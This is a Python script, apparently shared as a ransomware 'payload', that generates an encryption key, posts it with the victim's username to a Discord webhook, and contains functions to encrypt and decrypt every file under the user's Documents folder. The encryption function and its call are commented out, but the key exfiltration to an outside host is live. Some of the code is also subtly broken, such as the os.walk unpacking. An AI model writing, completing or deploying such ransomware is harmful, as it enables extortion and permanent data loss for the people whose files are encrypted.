
"""
 ____    _    _   _  ____ _____ ____   ___  _   _ ____  
|  _ \  / \  | \ | |/ ___| ____|  _ \ / _ \| | | / ___| 
| | | |/ _ \ |  \| | |  _|  _| | |_) | | | | | | \___ \ 
| |_| / ___ \| |\  | |_| | |___|  _ <| |_| | |_| |___) |
|____/_/   \_\_| \_|\____|_____|_| \_\\___/ \___/|____/ 
                                                        
Warning: The encryption function has the ability to encrypt the entire folder
specified, including all files and subfolders contained within it. Improper usage or accidental
execution of this function may result in permanent loss of encrypted data. We strongly advise
using this function only if you have a full understanding of what you are doing, and to perform
a complete backup of any data that will be encrypted before proceeding. If you have any doubts
or uncertainties, we recommend seeking professional advice before using this function.

"""


from cryptography.fernet import Fernet
import os
import requests
import subprocess
import json


"""Decrypt function"""
def dec_folder(path, fernet):
    for root, files in os.walk(path):
        for filename in files:
            filepath = os.path.join(root, filename)
            if not os.access(filepath, os.R_OK):
                continue
            if "directory" in str(os.system(f"file {filepath}")):
                dec_folder(path=filepath, fernet=fernet)
            with open(filepath, "rb") as f:
                data = f.read()
            decrypted_data = fernet.decrypt(data) # the only one line different from enc_folder
            with open(filepath, "wb") as f:
                f.write(decrypted_data)


# """Encrypt function"""
# def enc_folder(path, fernet):
#     for root, files in os.walk(path):
#         for filename in files:
#             filepath = os.path.join(root, filename)
#             if not os.access(filepath, os.R_OK):
#                 continue
#             if "directory" in str(os.system(f"file {filepath}")):
#                 enc_folder(path=filepath, fernet=fernet)
#             with open(filepath, "rb") as f:
#                 data = f.read()
#             encrypted_data = fernet.encrypt(data) # the only one line different from dec_folder
#             with open(filepath, "wb") as f:
#                 f.write(encrypted_data)


"""Send the key used for encryption"""
def send_key(username, key, discord_webhook_url, INITIAL_PATH, FERNET):
    try:
        message = {
            "username": f"{username}",
            "content": f"Key:{key}"
        }
        message_json = json.dumps(message)
        resp = requests.post(discord_webhook_url, data=message_json, headers={'Content-Type': 'application/json'})
        if not resp.ok:
            raise ValueError("Error sending the key")
        # enc_folder(path=INITIAL_PATH, fernet=FERNET)
    except:
        print("Yoh bro you are safe now, but be very careful next time!!!!")
        exit()



"""Just some variables"""
KEY = Fernet.generate_key()
FERNET = Fernet(KEY)
USERNAME = subprocess.check_output(['whoami']).decode('ascii')
INITIAL_PATH = f"/home/{USERNAME}/Documents/"
WEBHOOK_URL = 'https://discord.com/api/webhooks/123/abc'

"""
I moved the sending of the key one execution before encryption so that if there should be any problem
 in sending (no connection, firewall blocking sending, etc...) it will not continue encrypting the data.
It is a security measure for the users who will be using this payload.
"""
send_key(username=USERNAME, key=KEY, discord_webhook_url=WEBHOOK_URL, INITIAL_PATH=INITIAL_PATH, FERNET=FERNET)